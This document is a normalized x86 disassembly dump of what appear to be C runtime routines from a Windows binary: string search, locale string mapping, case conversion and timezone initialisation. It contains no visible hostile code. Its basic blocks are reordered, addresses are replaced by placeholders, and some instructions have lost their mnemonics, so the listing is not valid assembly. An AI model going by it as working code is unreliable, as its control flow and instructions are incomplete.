jb r-xdata
add esi edi
cmp [ esi ] 0x0
je r-xdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae r-xdata
lea esi [ eax + edx ]
cmp esi ebx
jae r-xdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp r-xdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne r-xdata
imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp r-xdata
lea eax [ edi + 0x8 ]
jmp r-xdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne r-xdata
cmp esi edx
jae r-xdata
inc ebx
inc esi
jmp r-xdata
movzx eax al
add esi eax
jmp r-xdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp esi edi
jae r-xdata
cmp eax edx
jae r-xdata
inc ebx
inc eax
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp r-xdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ eax ] dl
add eax 0x8
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov esi ebx
jmp r-xdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_4341de
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
movzx ecx [ edx ]
push edi
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax [ edi + 0x10 ]
sar eax 0xc
cmp ecx [ ebp + 0x14 ]
lea edi [ edi + eax * 8 + 0x18 ]
jbe r-xdata
jae r-xdata
mov eax [ ebp + 0x14 ]
sub ecx eax
mov [ edx ] al
add [ edi ] ecx
mov [ edi + 0x4 ] 0xf1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
lea esi [ edx + eax ]
lea eax [ ebx + 0xf8 ]
cmp esi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ecx + edx ]
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov al [ ebp + 0x14 ]
mov [ edx ] al
mov eax [ ebx ]
cmp edx eax
ja r-xdata
cmp eax esi
inc eax
jmp r-xdata
sub ecx [ ebp + 0x14 ]
add [ edi ] ecx
cmp esi eax
jbe r-xdata
cmp eax esi
jae r-xdata
lea eax [ ebx + 0xf8 ]
cmp esi eax
jae r-xdata
and [ ebx + 0x4 ] 0x0
lea eax [ ebx + 0x8 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] esi
cmp [ esi ] al
jne r-xdata
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc eax
cmp [ esi + eax ] 0x0
je r-xdata
sub_434290
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_430d2a
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_435744
mov ebx eax
add esp 0x4
call sub_435744
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_430d8b
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4343a0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_434430
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_4344f0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_43452a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_437235
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_434750
push ebp
mov ebp esp
push edi
push esi
mov edi [ ebp + 0x8 ]
mov edx edi
mov esi edi
xor eax eax
or ecx 0xffffffff
[ edi ]
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
pop esi
pop edi
leave
retn
dec edi
dec edi
mov ah [ esi ]
mov al [ edi ]
mov [ esi ] al
mov [ edi ] ah
inc esi
dec edi
jmp r-xdata
cmp esi edi
jae r-xdata
sub_434780
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x61
jl r-xdata
push [ esp + 0x10 ]
call sub_4347ef
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_430d2a
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x7a
jg r-xdata
push esi
call edi
push 0x13
call sub_430d8b
pop ecx
jmp r-xdata
sub eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_4347ef
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_43452a
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_4348c0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jb r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_434900
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_434940
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_434970
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_4349a8
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_42f0a0
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_42dc30
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_434af1
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xb
call sub_430d2a
cmp [ rw-data ] 0x0
pop ecx
jne r-xdata
push 0xb
call sub_430d8b
pop ecx
call sub_434b1f
inc [ rw-data ]
sub_434b1f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0xc
pop edi
xor ebx ebx
push edi
mov [ ebp - 0x8 ] ebx
call sub_430d2a
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
mov [ rw-data ] ebx
mov [ esp ] r--data
call sub_43612e
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
call sub_430d8b
mov [ esp ] rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
call sub_430d8b
pop ecx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bx
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_42ded6
push esi
call sub_42eea0
inc eax
push eax
call sub_42dd9c
add esp 0xc
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_430da0
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_4350c0
push edi
call sub_430d8b
push 0x3
push esi
push [ rw-data ]
call sub_436030
mov eax [ rw-data ]
add esi 0x3
add esp 0x18
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_42d75a
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] 0x1
inc esi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ ebp - 0x4 ] ebx
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebx
push 0x3f
mov edi 0x220
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x3f
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
inc esi
push esi
call sub_42d75a
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
test eax eax
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_436030
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_42d75a
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_434dc7
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_434f73
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_434f73
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_434f73
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_434f73
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_434f73
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jg r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_4350c0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
